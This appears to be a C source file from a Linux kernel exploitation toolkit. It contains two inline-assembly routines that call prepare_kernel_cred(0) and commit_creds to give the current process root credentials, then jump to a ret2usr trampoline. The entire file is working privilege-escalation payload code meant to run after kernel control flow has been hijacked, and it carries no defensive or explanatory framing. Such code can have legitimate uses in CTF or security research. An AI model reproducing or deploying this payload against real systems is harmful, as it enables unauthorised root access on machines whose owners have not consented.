#include "kcred.h"
#include "utils.h"
#include "globals.h"
#include <stdint.h>
#include <sys/types.h>

/* ============= 1 =============
 * Privesc from kernel creds:
 *      commit_creds(prepare_kernel_cred(0));
 *
 * We can use global variables in the assembly,
 *      to avoid program crash due to register clobbers
 */
void _glb_commit_prepare_cred(void)
{
    __asm__ __volatile__ (
        ".intel_syntax noprefix;"
        // prepare_kernel_cred
        "movabs rax, " stringify(PREPARE_KERNEL_CRED_ADDR) ";"
        "xor rdi, rdi;"
        "call rax;"
        // commit_creds
        "mov rdi, rax;"
        "movabs rax, " stringify(COMMIT_CREDS_ADDR) ";"
        "call rax;"
        // jmp to ret2usr_trampoline or any return stub
        "movabs rax, " stringify(POST_PRIVESC_JUMP_ADDR) ";"
        "jmp rax;"
        ".att_syntax;"
    );
}

/* 
 * Otherwise, use the most less-used registers
 *      to pass variables to avoid clobber issues
 */
void __commit_prepare_cred(uintptr_t commit_creds_addr,
                            uintptr_t prepare_kernel_cred_addr,
                            uintptr_t post_privesc_jmp_addr)
{
    __asm__ __volatile__ (
        ".intel_syntax noprefix;"
        // prepare_kernel_cred*/
        "mov rax, %[pkc];"
        "xor rdi, rdi;"
        "call rax;"
        // commit_creds*/
        "mov rdi, rax;"
        "mov rax, %[cc];"
        "call rax;"
        // jmp to ret2usr_trampoline or any return stub
        "mov rax, %[ret];"
        "jmp rax;"
        ".att_syntax;"
        :
        : [pkc] "r"(prepare_kernel_cred_addr),
          [cc]  "r"(commit_creds_addr),
          [ret] "r"(post_privesc_jmp_addr)
        : "rax", "rdi", "rsi", "rdx", "rcx"
    );
}
